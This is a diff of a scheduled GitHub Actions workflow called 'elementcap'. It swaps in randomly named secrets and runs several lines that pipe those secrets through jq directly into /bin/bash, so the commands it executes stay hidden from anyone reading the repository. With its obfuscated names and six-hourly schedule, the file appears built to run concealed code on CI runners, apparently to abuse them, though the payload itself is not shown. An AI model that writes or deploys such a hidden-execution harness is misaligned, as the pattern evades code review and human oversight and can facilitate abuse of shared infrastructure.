@@ -3,7 +3,8 @@ name: elementcap
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 5/6 * * *'
+    - cron: '9 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,17 +12,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: elementcap
         env:
-          flk1693: ${{ secrets.flk1693 }}
+          mgn45: ${{ secrets.mgn45 }}
         run: |
-          echo $flk1693 | jq -r .h67 | /bin/bash
-          echo $ywpej5520 | jq -r .ws48994 | /bin/bash
-          echo $ihjf23477 | jq -r .iwlm5 | /bin/bash
-          echo $w63193 | jq -r .kt1184 | /bin/bash
-          echo $l9 | jq -r .jj3 | /bin/bash
-          echo $asml2 | jq -r .vue98573 | /bin/bash
-          echo $sp68488 | jq -r .s0424 | /bin/bash
-          echo $a020 | jq -r .b68052 | /bin/bash
-          echo $yudnm4 | jq -r .ee458 | /bin/bash
-          echo $dj43080 | jq -r .j25 | /bin/bash
-          echo $jhb32 | jq -r .b38 | /bin/bash
+          echo $mgn45 | jq -r .jgvbe6336 | /bin/bash
+          echo $lnka94255 | jq -r .vuz3448 | /bin/bash
+          echo $fpkay1 | jq -r .lx9597 | /bin/bash
+          echo $l994 | jq -r .wiqgl941 | /bin/bash
+          echo $fvhho34966 | jq -r .ezm110 | /bin/bash
 
